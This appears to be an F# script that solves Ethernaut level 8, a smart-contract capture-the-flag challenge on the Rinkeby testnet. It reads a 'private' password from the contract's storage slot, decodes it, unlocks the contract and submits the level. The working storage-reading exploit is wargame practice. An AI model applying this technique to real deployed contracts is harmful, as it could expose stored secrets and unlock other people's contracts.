#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.6.0" 

open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let con = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let mon = createReceiptMonitor con

let call = makeEthCall con constants
let txn = makeEthTxn con constants

let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut
let submitInstance = txnEthernaut (ByString "submitLevelInstance") 

// Get a level instance, you pass in the address of ( I guess) the base or prototype of the contract, and you
// get a copy, logged via the Event emitted inside `createLevelInstance` 
txnEthernaut (ByString "createLevelInstance") [Address "0xf94b476063B6379A3c8b6C836efB8B3e10eDe188"] "0"
|> monitorTransaction mon

// Goal of this challenge is to read the password out of storage, and then send a transaction. Should be quite straightforward, as I've
// already worked with GetStorageAt before now and understand how it works.

// Contract deployed to 0x185b095f3562f17150279923e5891e8a6f40cddb

let level8ABI = """[{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"locked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"}]""" |> ABI

let level8 = loadDeployedContract digest "0x185b095f3562f17150279923e5891e8a6f40cddb" RINKEBY level8ABI |> bindDeployedContract |> List.head
let readStorage = makeEthRPCCall con EthMethod.GetStorageAt ["0x185b095f3562f17150279923e5891e8a6f40cddb"; "0x1"; LATEST] |> fun p -> printfn $"{p}"

// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 or "A very strong secret password :)"

// Send password
makeEthTxn con constants level8 (ByString "unlock") [BytesSz "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"] ZEROV
|> monitorTransaction mon

// check result, could also be done with GetStorageAt with a position arg of 0x0
makeEthCall con constants level8 (ByString "locked") []
|> logEthCallResult Typed

// [Bool false]

// submit level
submitInstance [Address "0x185b095f3562f17150279923e5891e8a6f40cddb"] ZEROV
|> monitorTransaction mon
